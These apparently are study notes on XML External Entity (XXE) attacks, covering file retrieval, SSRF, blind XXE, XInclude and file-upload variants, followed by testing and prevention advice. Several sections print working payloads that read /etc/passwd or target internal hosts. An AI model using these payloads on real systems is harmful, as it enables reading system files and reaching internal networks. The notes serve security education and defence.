--- ---

<h4>What is XXE?</h4>  

![](https://assets.tryhackme.com/additional/cmn-owasptopten/XXE_600x315.png)

XXE stands for XML External Entity. It is a type of vulnerability that allows an attacker to access sensitive data by injecting external entities into an XML document. This can be used to retrieve data from the targeted system, such as files or network resources, or even to execute arbitrary code. It is important to properly validate and sanitize XML input in order to prevent XXE attacks.

An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.  
  
Types of XXE Attacks:
- Exploiting XXE to retrieves files
- Exploiting XXE to perform SSRF attacks
- Exploiting blind XXE to exfiltrate data out-of-band
- Exploiting blind XXE to retrieve data via error messages
  
- Why we use XML?  
  
	1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.  
  
	1. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.  
  
	3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.  
  
	4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.  
  
- Syntax  
  
	Every XML document mostly starts with what is known as XML Prolog.  

	```Terminal
	<?xml version="1.0" encoding="UTF-8"?>
	```
--- ---

<h4>Exploiting XXE to Retrieve Files</h4>

- Need to modify submitted XML in two ways
	- Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to a file.
	- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

- Example -- shopping application checking for stock by submitting the following XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId><
/stockCheck>
```

- Exploit
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM
"file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></st
ockCheck>
```

Define an external entity (&xxe;) whose value is the contents of /etc/passwd and uses the entity within the productId value.

--- ---

<h2>Exploiting XXE to Perform SSRF Attacks</h2>

- Need to do the following:
	- Define an external XML entity using the URL you want to target
	- Use the defined entity within a data value

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM " http://internal.vulnerable-
website.com/"> ]>
```
--- ---

<h2>Blind XXE Vulnerabilities</h2>

This means that the application does not return the values of any defined external entities in its responses, and so direct retrieval of server-side files is not possible.

XInclude Attacks
- Server steps
	- Application receives client-submitted data
	- Data is embedded on the server-side into an XML document
	- Document is then parsed

- XInclude
	- Part of the XML specification that allows an XML document to be built from sub-documents
	- Need to reference the XInclude namespace and provide the path to the file that you wish to include

```xml
<foo 
xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text"
href="file:///etc/passwd"/></foo>
```


More info about XML Injection ---> [HERE]([[3 - XML]])

--- ---

<h2>XXE Attacks via File Upload</h2>

- If a server allows the upload of DOCX or SVG, XXE can be embedded in these documents
- When the document is processed by the application, it will trigger the exploit XXE Attack via Modified Content Type

- Normal Request example:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-
urlencoded
Content-Length: 7
foo=bar
```

- If the server tolerates this, you can exploit it
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52
<?xml version="1.0" encoding="UTF-
8"?><foo>bar</foo>
```

--- ---

<h2>Testing & Prevention</h2>

**How to Find and Test for XXE vulnerabilities**
- Use BurpSuite's Web Vulnerability Scanner
- Manually testing involves the following:
	- Testing for file retrieval by defining an external entity based on a well-known OS file
	- Testing for blind XXE by defining an external entity based on a URL to a system you control
		§ Burp Collaborator Client can be used for this
	- Testing for vulnerab inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack

**How to Prevent XXE Vulnerabilities**
- Disable features that allow an application's XML parsing library to support potentially dangerous XML features that the application does not need
- Disable resolution of external entities
- Disable support for XInclude
	- Done via configuration options or programmatically overriding default behavor.

 --- ---

<h2>Top Injection</h2>

Detect the vulnerability

Basic entity test, when the XML parser parses the external entities the result should contain "John" in `firstName` and "Doe" in `lastName`. Entities are defined inside the `DOCTYPE` element.

```Terminal
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
---
Types of XXE Attacks:
- Exploiting XXE to retrieves files                                                    
- Exploiting XXE to perform SSRF attacks                                       
- Exploiting blind XXE to exfiltrate data out-of-band                   
- Exploiting blind XXE to retrieve data via error messages             
---
